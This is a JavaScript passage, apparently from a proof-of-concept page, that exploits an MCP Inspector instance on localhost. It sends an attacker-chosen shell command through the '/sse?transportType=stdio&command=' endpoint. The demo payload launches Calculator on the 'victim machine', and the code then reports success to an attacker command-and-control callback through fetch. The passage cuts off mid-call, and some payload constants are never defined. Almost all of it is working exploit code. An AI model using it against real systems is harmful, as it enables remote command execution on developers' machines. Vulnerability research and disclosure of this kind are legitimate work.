        // Configuration
        const MCP_INSPECTOR_URL = 'http://localhost:6277';

        const PAYLOAD_MAC = 'open -a Calculator';
        
        // Detect OS
        function getPayload() {
            const platform = navigator.platform.toLowerCase();
            if (platform.indexOf('win') !== -1) return PAYLOAD_WINDOWS;
            if (platform.indexOf('mac') !== -1) return PAYLOAD_MAC;
            return PAYLOAD_LINUX;
        }
        
        // Exploit function
        async function exploitMCPInspector() {
            const statusDiv = document.getElementById('status');
            
            try {
                // Attempt to exploit MCP Inspector
                // The vulnerable endpoint accepts stdio transport commands
                const exploitUrl = `${MCP_INSPECTOR_URL}/sse?transportType=stdio&command=${encodeURIComponent(getPayload())}`;
                
                console.log('[EXPLOIT] Attempting to exploit MCP Inspector...');
                console.log('[EXPLOIT] Target URL:', exploitUrl);

                statusDiv.className = 'status success';

                console.log('[EXPLOIT] Exploit attempt completed');
                console.log('[EXPLOIT] Calculator should have launched on victim machine');
                
                // Report success to attacker's C2 server

                    await fetch(ATTACKER_CALLBACK, {
